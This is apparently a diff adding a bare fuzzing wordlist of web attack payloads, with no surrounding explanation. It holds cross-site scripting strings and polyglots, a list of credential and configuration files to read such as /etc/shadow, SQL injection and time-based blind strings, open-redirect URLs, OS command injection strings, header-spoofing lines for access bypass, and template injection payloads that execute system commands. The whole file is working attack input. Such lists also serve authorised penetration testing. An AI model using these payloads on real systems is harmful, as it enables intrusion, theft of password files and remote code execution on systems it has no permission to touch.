@@ -1,0 +1,317 @@
+<script>alert(1)</script>
+<script>alert('XSS-P4IM0N')</script>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+%253cscript%253ealert(1)%253c/script%253e
+"><s"%2b"cript>alert(document.cookie)</script>
+foo<script>alert(1)</script>
+"-prompt(8)-"
+'-prompt(8)-'
+";a=prompt,a()//
+'-eval("window['pro'%2B'mpt'](8)")-'
+"-eval("window['pro'%2B'mpt'](8)")-"
+"onclick=prompt(8)>"@x.y
+"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+<image/src/onerror=prompt(8)>
+<img/src/onerror=prompt(8)>
+<script\x2Ftype="text/javascript">javascript:alert(1);</script>
+<script\x0Atype="text/javascript">javascript:alert(1);</script>
+'`"><\x3Cscript>javascript:alert(1)</script>        
+'`"><\x00script>javascript:alert(1)</script>
+<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
+'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
+<script>javascript:alert(1)</script\x0D
+<script>javascript:alert(1)</script\x0A
+"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
+<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
+`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
+`"'><img src=xxx:x \x20onerror=javascript:alert(1)>
+"`'><script>\x3Bjavascript:alert(1)</script>
+"`'><script>\x0Djavascript:alert(1)</script>
+"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
+"`'><script>\xE2\x80\x81javascript:alert(1)</script>
+"`'><script>\xE2\x80\x84javascript:alert(1)</script>
+"`'><script>\xE3\x80\x80javascript:alert(1)</script>
+"`'><script>\x09javascript:alert(1)</script>
+"`'><script>\xE2\x80\x89javascript:alert(1)</script>
+"`'><script>\xE2\x80\x85javascript:alert(1)</script>
+"`'><script>\xE2\x80\x88javascript:alert(1)</script>
+"`'><script>\x00javascript:alert(1)</script>
+"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
+"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
+<img src=# onerror\x3D"javascript:alert(1)" >
+<input onfocus=javascript:alert(1) autofocus>
+<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*<svg/*/onload=alert()//>
+javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/--><svg/onload=/*<html/*/onmouseover=alert()//> 
+javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>--><svg onload=/*<html/*/onmouseover=alert()//>
+javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template><svg/onload='/*--><html */ onmouseover=alert()//'>` 
+javascript:`/*</title></style></textarea></noscript></script></noembed></template></select/"/'/*--><frame onload=alert()><svg/\"/*<svg onload=' /**/-alert()//'>javascript:/*`/*\"/*'/*</noembed>"/*<frame src=javascript:/**/;alert()//--></title></textarea></style></noscript></template></select></script><<svg/onload= alert()//>
+javascript:alert();//<img src=x:x onerror=alert(1)>\";alert();//";alert();//';alert();//`;alert();// alert();//*/alert();//--></title></textarea></style></noscript></noembed></template></select></script><frame src=javascript:alert()><svg onload=alert()><!-- 
+javascript:/*--></title></style></template></noscript></noembed></textarea></script><svg/onload='+/"/+/onclick=1/+/[*/[]/+alert()//'>"><svg/onload=`+/"/+/onclick=/+/[*/[]/+alert()//'>"><script>alert()</script><frame src="javascript:alert()"></frameset>+\"; alert()//<img src onerror=alert()>
+javascript:alert(1)//\";alert(1);<!--jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//--><FRAME SRC="javascript:alert(1);"></textarea></style></iframe></noscript></noembed></template></option></select></script><img src=x onerror=alert(1)></title><script>alert(1)</script><img src=0 onerror=alert(1)><img src=x:x onerror=alert(1)> alert(1)//
+<img »src="j%20a%20v%20a%20s%20c%2 »0r%20i%20p%20t%20%3a%20a%20l »%20e%20r%20t%20(%20'%20x%20s »%20s%20'%20)" alt="j a v a s »c r i p t : a l e r t ( ' x »s s ' )" />
+/etc/apache2/mods-available/mime.conf
+/etc/apache2/mods-available/proxy.conf
+/etc/apache2/mods-available/setenvif.conf
+/etc/apache2/mods-available/ssl.conf
+/etc/avahi/avahi-daemon.conf
+/etc/bash.bashrc
+/etc/bluetooth/input.conf
+/etc/bluetooth/main.conf
+/etc/bluetooth/network.conf
+/etc/exports
+/etc/fedora-release
+/etc/firewall.rules
+/etc/foremost.conf
+/etc/httpd/logs/acces.log
+/etc/httpd/logs/acces_log
+/etc/httpd/logs/access.log
+/etc/httpd/logs/access_log
+/etc/httpd/logs/error.log
+/etc/passwd
+/etc/passwd-
+/etc/passwd~
+/etc/password.master
+/etc/samba/smbpasswd
+/etc/samba/smbusers
+/etc/security/access.conf
+/etc/shadow
+/etc/shadow-
+/etc/shadow~
+/etc/slackware-release
+/etc/smb.conf
+/etc/smbpasswd
+/[JBOSS]/server/default/conf/standardjaws.xml
+/[JBOSS]/server/default/conf/standardjboss.xml
+/[JBOSS]/server/default/deploy/jboss-logging.xml
+/MySQL/data/mysql-bin.index
+/MySQL/data/mysql-bin.log
+/MySQL/data/mysql.err
+/private/tmp/[JBOSS]/server/default/conf/login-config.xml
+/private/tmp/[JBOSS]/server/default/conf/server.log.properties
+/usr/ports/ftp/pure-ftpd/pure-ftpd.conf
+/usr/ports/ftp/pure-ftpd/pureftpd.passwd
+/var/log/log.smb
+/var/log/mail.err
+/var/log/mail.info
+/var/log/mail.log
+/var/log/maillog
+/var/www/html/webdav/passwd.dav
+/xampp/htdocs/admin.php
+/xampp/htdocs/leer.txt
+OR 1=1-- 
+OR 1=0-- 
+OR x=x-- 
+OR x=y-- 
+OR 3409=3409 AND ('pytW' LIKE 'pytW
+OR 3409=3409 AND ('pytW' LIKE 'pytY
+HAVING 1=1
+HAVING 1=0
+WHERE 1=1 AND 1=1
+WHERE 1=1 AND 1=0
+WHERE 1=1 AND 1=1#
+WHERE 1=1 AND 1=0#
+WHERE 1=1 AND 1=1--
+IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
+IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
+%' AND 8310=8310 AND '%'='
+%' AND 8310=8311 AND '%'='
+sleep(5)#
+1 or sleep(5)#
+" or sleep(5)#
+' or sleep(5)#
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))
+ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4
+ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5
+UNION ALL SELECT 1
+UNION ALL SELECT 1,2
+UNION ALL SELECT 1,2,3
+AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+admin") or "1"="1"#
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+////google.com/%2f..
+////www.whitelisteddomain.tld@google.com/%2f..
+https://google.com/%2f..
+///www.google.com/%2e%2e%2f
+///www.whitelisteddomain.tld@www.google.com/%2e%2e%2f
+https:google.com
+//google.com
+http://3H6k7lIAiqjfNeN@0xd8.0x3a.0xd6.0xce
+http://XY>.7d8T\205pZM@0xd8.0x3a.0xd6.0xce
+//google.com\@www.whitelisteddomain.tld
+/redirect?url=//example.com&next=//example.com&redirect=//example.com&redir=//example.com&rurl=//example.com&redirect_uri=//example.com
+/redirect?url=/\/example.com&next=/\/example.com&redirect=/\/example.com&redir=/\/example.com&rurl=/\/example.com&redirect_uri=/\/example.com
+/google.com/%2f%2e%2e
+/http:/google.com
+/.google.com
+///\;@google.com
+///google.com
+/////google.com/
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+/index.html|id|
+;id;
+;id
+;netstat -a;
+;system('cat%20/etc/passwd')
+;id;
+|id
+|/usr/bin/id
+a;id;
+a);id|
+a;id|
+a)|id
+a|id
+a)|id;
+a|id
+|/bin/ls -al
+& ping -i 30 127.0.0.1 &
+$(`cat /etc/passwd`)
+cat /etc/passwd
+%0Acat%20/etc/passwd
+{{ get_user_file("/etc/passwd") }}
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+<!--#exec cmd="/bin/cat /etc/shadow"-->
+<!--#exec cmd="/usr/bin/id;-->
+system('cat /etc/passwd');
+<?php system("cat /etc/passwd");?>
+%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
+%20{${phpinfo()}}
+| dir
+; dir
+$(`dir`)
+& dir
+&&dir
+&& dir
+| dir C:\
+eval('whoami')
+eval('whoami');
+| ls -l /etc/
+netsh firewall set opmode disable
+netstat
+| sysinfo
+; sysinfo
+& sysinfo
+&& sysinfo
+whoami
+uname
+;uname;
+| uname -a
+; uname -a
+& uname -a
+&& uname -a
+uname -a
+&& whoami
+{{ get_user_file("C:\boot.ini") }}
+{{ get_user_file("/etc/hosts") }}
+{{4+4}}
+{{4+8}}
+12345678
+23456789
+34567890
+45678901
+56789012
+67890123
+78901234
+89012345
+90123456
+11223344
+22334455
+33445566
+44556677
+55667788
+66778899
+Base-Url: 127.0.0.1
+Client-IP: 127.0.0.1
+Http-Url: 127.0.0.1
+Proxy-Host: 127.0.0.1
+Proxy-Url: 127.0.0.1
+Real-Ip: 127.0.0.1
+Redirect: 127.0.0.1
+Referer: 127.0.0.1
+Referrer: 127.0.0.1
+Refferer: 127.0.0.1
+Request-Uri: 127.0.0.1
+Uri: 127.0.0.1
+Url: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+X-Forward-For: 127.0.0.1
+X-Forwarded-By: 127.0.0.1
+X-Forwarded-For-Original: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+X-Forwarded-Port: 443
+X-Forwarded-Port: 4443
+X-Forwarded-Port: 80
+X-Forwarded-Port: 8080
+X-Forwarded-Port: 8443
+X-Forwarded-Scheme: http
+X-Forwarded-Scheme: https
+X-Forwarded-Server: 127.0.0.1
+X-Forwarded: 127.0.0.1
+X-Forwarder-For: 127.0.0.1
+X-Host: 127.0.0.1
+X-Http-Destinationurl: 127.0.0.1
+X-Http-Host-Override: 127.0.0.1
+X-Original-Remote-Addr: 127.0.0.1
+X-Original-Url: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Proxy-Url: 127.0.0.1
+X-Real-Ip: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Rewrite-Url: 127.0.0.1
+X-True-IP: 127.0.0.1
+{{2*2}}[[3*3]]
+{{3*3}}
+{{3*'3'}}
+<%= 3 * 3 %>
+${6*6}
+${{3*3}}
+@(6+5)
+#{3*3}
+#{ 3 * 3 }
+*{7*7}
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
+{{config.items()}}
+{{ [].class.base.subclasses() }}
+{{''.class.mro()[1].subclasses()}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{{''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}
+{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
+{{'a'.toUpperCase()}} 
+{{ request }}
+{{self}}
+<%= File.open('/etc/passwd').read %>
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
+${"freemarker.template.utility.Execute"?new()("id")}
+{{app.request.query.filter(0,0,1024,{'options':'system'})}}
+{php}echo `id`;{/php}
+{{['id']|filter('system')}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
+{{request|attr(["_"*2,"class","_"*2]|join)}}
+{{request|attr(["__","class","__"]|join)}}
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+${T(java.lang.System).getenv()}
+${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
